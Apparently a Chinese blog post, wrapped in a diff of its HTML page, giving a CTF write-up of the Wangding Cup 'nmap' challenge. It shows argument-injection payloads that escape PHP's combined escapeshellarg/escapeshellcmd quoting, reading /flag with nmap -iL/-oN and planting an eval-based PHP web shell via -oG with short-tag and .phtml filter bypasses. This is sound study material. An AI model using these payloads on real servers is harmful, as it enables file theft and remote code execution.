@@ -1,0 +1,809 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF-Web," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前两天看了网鼎杯的一道题目，其中涉及到了一些比较有意思的东西，记录一下。 题目地址ctfhub上已有题目环境 1https:&amp;#x2F;&amp;#x2F;www.ctfhub.com&amp;#x2F;#&amp;#x2F;challenge  题目名为nmap，访问首页内容为输入ip或域名调用namp扫描，前端注释里提示了flag位置，很直白的一道题目：  正常扫描：  思路很明显，就是类似命令注入，拼接namp命令">
+<meta name="keywords" content="CTF-Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网鼎杯朱雀组-nmap">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;06&#x2F;01&#x2F;%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%9C%B1%E9%9B%80%E7%BB%84-nmap&#x2F;index.html">
+<meta property="og:site_name" content="Sharp_T&#39;s Blog">
+<meta property="og:description" content="前两天看了网鼎杯的一道题目，其中涉及到了一些比较有意思的东西，记录一下。 题目地址ctfhub上已有题目环境 1https:&amp;#x2F;&amp;#x2F;www.ctfhub.com&amp;#x2F;#&amp;#x2F;challenge  题目名为nmap，访问首页内容为输入ip或域名调用namp扫描，前端注释里提示了flag位置，很直白的一道题目：  正常扫描：  思路很明显，就是类似命令注入，拼接namp命令">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;06&#x2F;98b0ab02c74b8999.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;06&#x2F;7638af01a5364015.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;06&#x2F;942ee608407e2881.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;06&#x2F;105921f8dbbec066.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;06&#x2F;b7284b3b4f19ee59.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;06&#x2F;bc8cdfef549f6db3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;06&#x2F;792fd72d2a51e28a.png">
+<meta property="og:updated_time" content="2020-06-17T10:21:14.735Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;06&#x2F;98b0ab02c74b8999.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/06/01/网鼎杯朱雀组-nmap/"/>
+
+
+
+
+
+  <title>网鼎杯朱雀组-nmap | Sharp_T's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sharp_T's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/01/%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%9C%B1%E9%9B%80%E7%BB%84-nmap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sharp_T">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sharp_T's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">网鼎杯朱雀组-nmap</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-01T16:13:06+08:00">
+                2020-06-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>前两天看了网鼎杯的一道题目，其中涉及到了一些比较有意思的东西，记录一下。</p>
+<h2 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h2><p>ctfhub上已有题目环境</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.ctfhub.com&#x2F;#&#x2F;challenge</span></pre></td></tr></table></figure>
+
+<p>题目名为nmap，访问首页内容为输入ip或域名调用namp扫描，前端注释里提示了flag位置，很直白的一道题目：</p>
+<p><img src="https://i.bmp.ovh/imgs/2020/06/98b0ab02c74b8999.png" alt=""></p>
+<p>正常扫描：</p>
+<p><img src="https://i.bmp.ovh/imgs/2020/06/7638af01a5364015.png" alt=""></p>
+<p>思路很明显，就是类似命令注入，拼接namp命令，来获取flag，后端的PHP代码可能为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">echo system(&quot;nmap -T4 -sT -Pn -F &quot;.$host);</span></pre></td></tr></table></figure>
+
+<p>需要用到的nmap参数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">-iL　　从inputfilename文件中读取扫描的目标。在这个文件中要有一个主机或者网络的列表，由空格键、制表键或者回车键作为分割符。如果使用-iL-，nmap就会从标准输入stdin读取主机名字。你可以从指定目标一节得到更加详细的信息</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">-oN&#x2F;-oX&#x2F;-oG　　把扫描结果重定向到一个可读的文件logfilename中，分别是正常、XML、grepable 三种格式</span></pre></td></tr></table></figure>
+
+<h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>通过-iL参数读取/flag内容，然后通过-oN将扫描结果输出到一个文件中，payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">127.0.0.1&#39; -iL &#x2F;flag -oN flag.txt &#39;</span></pre></td></tr></table></figure>
+
+<p>点击Scan，虽然扫描失败，但是结果已经输出到文件中：</p>
+<p><img src="https://i.bmp.ovh/imgs/2020/06/942ee608407e2881.png" alt=""></p>
+<p>然后请求/flag.txt查看扫描结果，获取到flag：</p>
+<p><img src="https://i.bmp.ovh/imgs/2020/06/105921f8dbbec066.png" alt=""></p>
+<h4 id="解法-2"><a href="#解法-2" class="headerlink" title="解法 2"></a>解法 2</h4><p>通过-oG讲一句话木马写入一个php文件中getshell，payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#39; &lt;?php @eval($_GET[&quot;shell&quot;]);?&gt; -oG shell.php &#39;</span></pre></td></tr></table></figure>
+
+<p>点击扫描发现服务端返回Hacker，未能正常扫描，几次尝试之后，发现原因是后端代码限制，不允许出现php：</p>
+<p><img src="https://i.bmp.ovh/imgs/2020/06/b7284b3b4f19ee59.png" alt=""></p>
+<p>绕过方式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">文件后缀：phtml</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">文件内容：通过短标签的方式绕过（&lt;? ?&gt;，short_open_tag 決定是否可使用短标记，&lt;?&#x3D; 可以代替 &lt;? echo）</span></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#39; &lt;?&#x3D; @eval($_GET[&quot;shell&quot;]);?&gt; -oG shell.phtml &#39;</span></pre></td></tr></table></figure>
+
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">require(&#39;settings.php&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">set_time_limit(0);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&#39;host&#39;])):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">	if (!defined(&#39;WEB_SCANS&#39;)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        	die(&#39;Web scans disabled&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">	$host &#x3D; $_POST[&#39;host&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">	if(stripos($host,&#39;php&#39;)!&#x3D;&#x3D;false)&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">		die(&quot;Hacker...&quot;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">	$host &#x3D; escapeshellarg($host);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">	$host &#x3D; escapeshellcmd($host);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">	$filename &#x3D; substr(md5(time() . rand(1, 10)), 0, 5);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">	$command &#x3D; &quot;nmap &quot;. NMAP_ARGS . &quot; -oX &quot; . RESULTS_PATH . $filename . &quot; &quot; . $host;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">	$result_scan &#x3D; shell_exec($command);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">	if (is_null($result_scan)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">		die(&#39;Something went wrong&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">	&#125; else &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">		header(&#39;Location: result.php?f&#x3D;&#39; . $filename);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>
+
+<p>从源码中我们可以看到，$host中不允许存在php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">phtml绕过php后缀</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">短标签绕过&lt;?php ?&gt;中的php</span></pre></td></tr></table></figure>
+
+<p>而这道题中payload的构造关键点在于两个转义函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。</span></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">escapeshellcmd - shell 元字符转义</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</span></pre></td></tr></table></figure>
+
+<p>再详细一点儿：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">escapeshellarg - 转义字符串中的单引号并使用单引号包裹此部分，使得其只能传递一个参数，且不能执行不同的命令</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">escapeshellcmd - 转义&amp; # ; &#96; | * ? ~ &lt; &gt; ^ ( ) [ ] &#123; &#125; $ 、x0A和xF，&#39;和&quot;仅在落单时被转义，使得其只能执行一个命令，但可以传递多个参数</span></pre></td></tr></table></figure>
+
+<p>escapeshellcmd会转义的字符：</p>
+<p><a href="https://github.com/php/php-src/blob/PHP-5.4.45/ext/standard/exec.c" target="_blank" rel="noopener">https://github.com/php/php-src/blob/PHP-5.4.45/ext/standard/exec.c</a></p>
+<p><img src="https://i.bmp.ovh/imgs/2020/06/bc8cdfef549f6db3.png" alt=""></p>
+<p>这两个函数本身是没什么问题的，但是如果放在一起用，就可能产生一些非预想的结果。</p>
+<p>以这道题为例，分析一下我们的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$host &#x3D; &quot;127.0.0.1&#39; -iL &#x2F;flag -oN flag.txt &#39;&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$host &#x3D; escapeshellarg($host);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">echo($host.&quot;\n&quot;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">$host &#x3D; escapeshellcmd($host);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">echo($host.&quot;\n&quot;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>
+
+<p><img src="https://i.bmp.ovh/imgs/2020/06/792fd72d2a51e28a.png" alt=""></p>
+<p>仔细分析一下这两个函数的处理过程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">传入的参数为127.0.0.1&#39; -iL &#x2F;flag -oN flag.txt &#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">经过escapeshellarg处理后，变成了&#39;127.0.0.1&#39;\&#39;&#39; -iL &#x2F;flag -oN flag.txt &#39;\&#39;&#39;&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">再经过escapeshellcmd处理后，变成了&#39;127.0.0.1&#39;\\&#39;&#39; -iL &#x2F;flag -oN flag.txt &#39;\\&#39;&#39;&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">这是因为escapeshellcmd对\进行了转义</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">最后执行的命令是nmap &#39;127.0.0.1&#39;\\&#39;&#39; -iL &#x2F;flag -oN flag.txt &#39;\\&#39;&#39;&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">其中\\被解释为\而不再是转义字符，所以后面的&#39;没有被转义，与再后面的&#39;配对儿成了一个空白连接符</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">去除掉无效的转义字符和已配对的单引号后，最后执行的大概是：nmap &#39;127.0.0.1&#39; -iL &#x2F;flag -oN flag.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">单引号成功逃逸</span></pre></td></tr></table></figure>
+
+<p>仔细想想其实这可以算是escapeshellarg和escapeshellcmd的设计问题，因为先转义参数再转义命令是很正常的想法，但是它们在配合时并没有考虑到单引号带来的隐患。</p>
+<p>参考链接：<br><a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">https://paper.seebug.org/164/</a><br><a href="https://blog.csdn.net/Pdsdt1/article/details/106199660/" target="_blank" rel="noopener">https://blog.csdn.net/Pdsdt1/article/details/106199660/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF-Web/" rel="tag"># CTF-Web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/21/API-Security-Tips/" rel="next" title="API-Security-Tips">
+                <i class="fa fa-chevron-left"></i> API-Security-Tips
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/uploads/avatar.png"
+                alt="Sharp_T" />
+            
+              <p class="site-author-name" itemprop="name">Sharp_T</p>
+              <p class="site-description motion-element" itemprop="description">剑气纵横三万里</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.t00ls.net/" title="T00LS" target="_blank">T00LS</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目地址"><span class="nav-number">1.</span> <span class="nav-text">题目地址</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#解法一"><span class="nav-number">1.0.1.</span> <span class="nav-text">解法一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解法-2"><span class="nav-number">1.0.2.</span> <span class="nav-text">解法 2</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#源码分析"><span class="nav-number">2.</span> <span class="nav-text">源码分析</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sharp_T</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
